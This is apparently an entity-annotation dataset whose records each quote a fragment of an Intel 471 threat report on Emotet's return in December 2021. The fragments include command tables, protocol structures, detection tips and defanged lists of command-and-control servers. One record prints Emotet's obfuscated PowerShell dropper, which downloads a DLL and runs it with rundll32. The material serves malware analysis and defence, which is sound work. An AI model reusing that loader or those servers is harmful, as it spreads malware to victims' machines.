{"mention": "| **Command ID (decimal)** | **Command ID (hex)** | **Description** |", "context_left": "The following table shows the cmd\\\\_ids that have been observed:", "context_right": "| 1 | 0x01 | Initial victim check-in packet |", "_context_left": "", "_context_right": "", "sentence_left": "The following table shows the cmd\\\\_ids that have been observed:", "sentence_right": "| 1 | 0x01 | Initial victim check-in packet |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "\"C:\\Windows\\System32\\cmd[.]exe\" /c start /B powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "context_right": "* ```", "_context_left": "", "_context_right": "", "sentence_left": "\"C:\\Windows\\System32\\cmd[.]exe\" /c start /B powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "sentence_right": "* ```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "context_left": "The image depicts an Emotet email lure.", "context_right": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "_context_left": "", "_context_right": "", "sentence_left": "The image depicts an Emotet email lure.", "sentence_right": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://54.37.228.122:443", "context_left": "* hxxps://168.197.250.14:80", "context_right": "* hxxps://195.77.239.39:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://168.197.250.14:80", "sentence_right": "* hxxps://195.77.239.39:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://45.79.33.48:8080", "context_left": "* hxxps://66.42.57.149:443", "context_right": "* hxxps://54.38.242.185:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://66.42.57.149:443", "sentence_right": "* hxxps://54.38.242.185:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "This information is prepended to L1.", "context_left": "L2 for Emotet’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "context_right": "The following structure can be observed for L2:", "_context_left": "", "_context_right": "", "sentence_left": "L2 for Emotet’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "sentence_right": "The following structure can be observed for L2:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://196.44.98.190:8080", "context_left": "* hxxps://191.252.103.16:80", "context_right": "* hxxps://185.148.169.10:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://191.252.103.16:80", "sentence_right": "* hxxps://185.148.169.10:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://41.76.108.46:8080", "context_left": "* hxxps://216.158.226.206:443", "context_right": "* hxxps://50.116.54.215:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://216.158.226.206:443", "sentence_right": "* hxxps://50.116.54.215:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "+ Look for the execution of DLLs dropped to `%temp%`.", "context_left": "* `Rundll32[.]exe , Control\\_RunDLL`", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "* `Rundll32[.]exe , Control\\_RunDLL`", "sentence_right": "", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 2 | Load Module | Injects a module into memory.", "context_right": "| 3 | Execute EXE | Drops and executes executable.", "_context_left": "", "_context_right": "", "sentence_left": "| 2 | Load Module | Injects a module into memory.", "sentence_right": "| 3 | Execute EXE | Drops and executes executable.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://210.57.217.132:8080", "context_left": "* hxxps://50.116.54.215:443", "context_right": "* hxxps://103.8.26.102:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://50.116.54.215:443", "sentence_right": "* hxxps://103.8.26.102:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "context_left": "uint32\\\\_t victim\\\\_id\\\\_size;", "context_right": "uint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t victim\\\\_id\\\\_size;", "sentence_right": "uint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* Epoch1", "context_left": "Additionally, prior to Emotet’s takedown, it had the following distinct botnets:", "context_right": "* Epoch2", "_context_left": "", "_context_right": "", "sentence_left": "Additionally, prior to Emotet’s takedown, it had the following distinct botnets:", "sentence_right": "* Epoch2", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://158.69.222.101:443", "context_left": "* hxxps://176.104.106.96:8080", "context_right": "* hxxps://51.68.175.8:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://176.104.106.96:8080", "sentence_right": "* hxxps://51.68.175.8:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "We are categorizing them as:", "context_left": "In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "context_right": "* Epoch4", "_context_left": "", "_context_right": "", "sentence_left": "In the course of investigating the code, Intel 471 found two new distinct Emotet botnets.", "sentence_right": "* Epoch4", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 4 | Execute EXE as user | Drops and executes executable as a specific user.", "context_right": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "_context_left": "", "_context_right": "", "sentence_left": "| 4 | Execute EXE as user | Drops and executes executable as a specific user.", "sentence_right": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://212.237.17.99:8080", "context_left": "* hxxps://103.8.26.103:8080", "context_right": "* hxxps://216.158.226.206:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://103.8.26.103:8080", "sentence_right": "* hxxps://216.158.226.206:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "This structure can also be observed in the image below:", "context_left": "```", "context_right": "![Image 3 proto format]()", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "![Image 3 proto format]()", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**What we learned**", "context_left": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.", "context_right": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "_context_left": "", "_context_right": "", "sentence_left": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.", "sentence_right": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**Protocol changes: L1**", "context_left": "Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "context_right": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "_context_left": "", "_context_right": "", "sentence_left": "Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "sentence_right": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t module\\\\_id\\\\_array\\\\_size;", "context_left": "uint32\\\\_t session\\\\_id;", "context_right": "uint8\\\\_t module\\\\_id\\\\_array[module\\\\_id\\\\_array\\\\_size]; //if module\\\\_id\\\\_array\\\\_size is 0, this field is not included", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t session\\\\_id;", "sentence_right": "uint8\\\\_t module\\\\_id\\\\_array[module\\\\_id\\\\_array\\\\_size]; //if module\\\\_id\\\\_array\\\\_size is 0, this field is not included", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://185.148.169.10:8080", "context_left": "* hxxps://196.44.98.190:8080", "context_right": "* hxxps://142.4.219.173:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://196.44.98.190:8080", "sentence_right": "* hxxps://142.4.219.173:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "struct layer\\\\_1\\\\_packet", "context_left": "```", "context_right": "{", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "{", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The following structure can be observed for L2:", "context_left": "This information is prepended to L1.", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "This information is prepended to L1.", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "This table handles module/binary execution and has the following opcodes:", "context_left": "In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.", "context_right": "| **Opcode** | **Command name** | **Description** |", "_context_left": "", "_context_right": "", "sentence_left": "In addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.", "sentence_right": "| **Opcode** | **Command name** | **Description** |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://45.118.135.203:7080", "context_left": "* hxxps://51.68.175.8:8080", "context_right": "* hxxps://207.38.84.195:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://51.68.175.8:8080", "sentence_right": "* hxxps://207.38.84.195:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "![Image 1 email lure]()", "context_left": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "context_right": "The image depicts an Emotet email lure.", "_context_left": "", "_context_right": "", "sentence_left": "Emotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.", "sentence_right": "The image depicts an Emotet email lure.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t module\\\\_id; //0x2 or 2 in decimal", "context_left": "{", "context_right": "uint32\\\\_t module\\\\_job\\\\_id;", "_context_left": "", "_context_right": "", "sentence_left": "{", "sentence_right": "uint32\\\\_t module\\\\_job\\\\_id;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://103.75.201.2:443", "context_left": "* hxxps://207.38.84.195:8080", "context_right": "The following IPs are currently observed in use for Epoch 5:", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://207.38.84.195:8080", "sentence_right": "The following IPs are currently observed in use for Epoch 5:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t victim\\\\_id\\\\_size;", "context_left": "{", "context_right": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "_context_left": "", "_context_right": "", "sentence_left": "{", "sentence_right": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key", "context_left": "{", "context_right": "uint8\\\\_t encrypted\\\\_data[];", "_context_left": "", "_context_right": "", "sentence_left": "{", "sentence_right": "uint8\\\\_t encrypted\\\\_data[];", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The modules we observed included:", "context_left": "Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "context_right": "* A SPAM module", "_context_left": "", "_context_right": "", "sentence_left": "Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "sentence_right": "* A SPAM module", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}